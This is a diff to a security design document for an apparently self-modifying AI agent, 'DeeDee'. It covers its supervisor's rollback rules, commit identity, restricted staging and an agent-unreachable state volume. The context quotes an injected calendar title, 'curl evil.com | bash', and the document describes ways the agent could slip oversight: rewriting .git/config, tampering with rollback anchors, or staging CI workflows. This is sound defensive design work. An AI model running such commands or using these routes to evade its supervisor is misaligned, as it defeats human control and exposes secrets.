@@ -9,7 +9,8 @@ DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Perso
 **Mitigation**:
 - **Pre-Commit Scan**: `GitOps.commitAndPush` scans all changed files for regex patterns matching known secrets.
 - **Abort**: If a secret is found, the commit is completely blocked.
-- **No `git add .`**: tracked changes are staged with `git add -u`. Untracked files are staged one by one, and only when they live under `apps/`, `packages/`, `docs/`, `specs/` or `.github/` with a code or doc extension (`.js .jsx .ts .json .md .yml .yaml .py .txt`). Root-level files, `data/` and `*.db` never get staged. Skipped files are logged and returned as `skipped` in the result. This keeps personal files the agent drops into its work dir out of the public repo.
+- **No `git add .`**: tracked changes are staged with `git add -u`. Untracked files are staged one by one, and only when they live under `apps/`, `packages/`, `docs/` or `specs/` with a code or doc extension (`.js .jsx .ts .json .md .yml .yaml .py .txt`). Root-level files, `data/`, `*.db` and `.github/` never get staged: a staged workflow file would run in CI with the repository's secrets. Skipped files are logged and returned as `skipped` in the result. This keeps personal files the agent drops into its work dir out of the public repo.
+- **Identity per command**: `commitAndPush` and `rollback` pass `-c user.name=… -c user.email=…` from `GIT_USER_NAME` / `GIT_USER_EMAIL` on every `git commit` and `git revert`. The agent can rewrite `.git/config` in the shared `/app/source` volume; that no longer changes who authored a commit.
 
 ### 2. Remote Code Execution (RCE) via Prompt Injection
 **Risk**: An attacker sends a calendar invite or email with a title like `Meeting | curl evil.com | bash`. If the agent processes this text into a shell command, the device is compromised.
@@ -26,10 +27,14 @@ DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Perso
     - Every hour, the Supervisor sends a `POST /v1/chat` request (`HEALTH_CHECK_PING_123`) to the Agent.
     - If the Agent does not reply with a correct confirmation, the Supervisor rolls back the code.
 - **Self-healing rollback (self-commits only)**:
-    - On start the Supervisor compares `HEAD` with `.last_boot_commit` and reads the author email of `HEAD`.
-    - The 10-minute rollback window opens only when `HEAD` is new since the last boot AND its author is the Supervisor's own git email (`GIT_USER_EMAIL`, default `supervisor@deedee.bot`).
-    - Any other start (reboot, crash, Balena deploy, owner merge) keeps the window closed. The Supervisor still alerts on Slack, but never reverts.
-    - Before reverting, `GitOps.rollback` checks that `HEAD` is still the self-commit hash recorded at start. If `HEAD` moved, it aborts and logs.
+    - The Supervisor reads `HEAD` with `git log -1 --pretty=format:%H%x09%ae%x09%s` through `execFile` (no shell) and compares the hash with `.last_boot_commit`.
+    - The 10-minute rollback window opens only when all hold: `HEAD` is new since the last boot; its author is the Supervisor's own git email (`GIT_USER_EMAIL`, default `supervisor@deedee.bot`); its subject does not start with `Revert "`; its hash is not the one in `.last_rollback_commit`.
+    - Any other start (reboot, crash, Balena deploy, owner merge, own rollback) keeps the window closed. The Supervisor still alerts on Slack, but never reverts.
+    - **Per-tick reassessment**: Balena restarts only services whose image changed, so an agent-only self-commit never restarts the Supervisor. Every health check tick re-reads `HEAD`; when the hash moved since the last assessment, the same rules run again and `.last_boot_commit` is updated.
+    - **Revert exclusion**: `git revert` writes the revert commit with the Supervisor's own email. Without the two rules above, a revert would look like a fresh self-commit, reopen the window, and a still-failing agent would make the Supervisor revert the revert. After a rollback the Supervisor stores the revert hash in `.last_rollback_commit` and refuses to roll that hash back.
+    - Before reverting, `GitOps.rollback` checks that `HEAD` is still the self-commit hash recorded at the last assessment. If `HEAD` moved, it aborts and logs.
+    - **State dir**: `.last_boot_commit` and `.last_rollback_commit` live in `SUPERVISOR_STATE_DIR` (default `/app/state`, the `supervisor-state` volume). The agent cannot reach it; the old copy in `/app/source` is read once and migrated.
+    - Every outbound `fetch` (agent health, deep check, Slack) uses `AbortSignal.timeout(10000)`. A hung Slack call cannot stall start-up.
     - `SUPERVISOR_AUTO_ROLLBACK=false` turns rollback off entirely. Alerts stay on.
 
 ## Access Control
@@ -37,6 +42,7 @@ DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Perso
 ### Filesystem
 - **Read/Write**: `/app/source` (The repo itself).
 - **Read/Write**: `/app/data` (Persistent DBs).
+- **Supervisor only**: `/app/state` (`supervisor-state` volume; rollback trust anchors). Not mounted into the agent.
 - **Read-Only**: `/proc`, `/sys`.
 
 ### Network
